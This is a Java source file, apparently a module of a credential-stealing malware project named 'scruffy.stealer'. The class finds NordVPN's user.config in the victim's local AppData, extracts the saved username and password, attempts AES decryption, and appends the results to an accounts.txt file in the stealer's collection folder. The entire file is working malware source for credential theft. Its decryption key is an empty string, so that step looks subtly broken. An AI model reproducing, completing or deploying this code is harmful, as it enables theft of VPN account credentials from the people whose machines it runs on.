package scruffy.stealer.impl.vpn;

import java.io.File;
import java.nio.file.Paths;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.parsers.DocumentBuilderFactory;

import org.apache.commons.io.FileUtils;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

import scruffy.stealer.utils.utilities;

public class nord_vpn extends utilities {

    public void initialize() {
        try {
            String appDataPath = System.getenv("localappdata");
            File nordVpnFolder = Paths.get(appDataPath, "NordVPN").toFile();

            if (!nordVpnFolder.exists() || !nordVpnFolder.isDirectory()) {
                return;
            }

            File[] nordVpnExeFiles = nordVpnFolder.listFiles((dir, name) -> name.startsWith("NordVpn.exe"));

            if (nordVpnExeFiles == null) {
                return;
            }

            for (File exeFile : nordVpnExeFiles) {
                File[] filesInExeDir = exeFile.getParentFile().listFiles();

                if (filesInExeDir == null) {
                    continue;
                }

                for (File file : filesInExeDir) {
                    File userConfigFile = new File(file, "user.config");

                    if (!userConfigFile.exists()) {
                        continue;
                    }

                    Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(userConfigFile);
                    doc.getDocumentElement().normalize();

                    NodeList usernameList = doc.getElementsByTagName("Username");
                    Element encodedUsername = (Element) usernameList.item(0);
                    String encodedUsernameValue = encodedUsername.getAttribute("value");

                    NodeList passwordList = doc.getElementsByTagName("Password");
                    Element encodedPassword = (Element) passwordList.item(0);
                    String encodedPasswordValue = encodedPassword.getAttribute("value");

                    if (encodedUsernameValue == null || encodedUsernameValue.isEmpty() || 
                        encodedPasswordValue == null || encodedPasswordValue.isEmpty()) {
                        continue;
                    }

                    String username = decode(encodedUsernameValue);
                    String password = decode(encodedPasswordValue);

                    FileUtils.writeStringToFile(new File(getFolder() + "/vpn/nord/accounts.txt"), String.format("Username: %s\nPassword: %s\n\n", username, password), "utf-8", true);
                    content.add("nord_vpn");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String decode(String s) {
        try {
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec("".getBytes(), "AES"));
            byte[] decodedBytes = cipher.doFinal(Base64.getDecoder().decode(s));
            return new String(decodedBytes, "utf-8");
        } catch (Exception ignored) {
            return "";
        }
    }
}
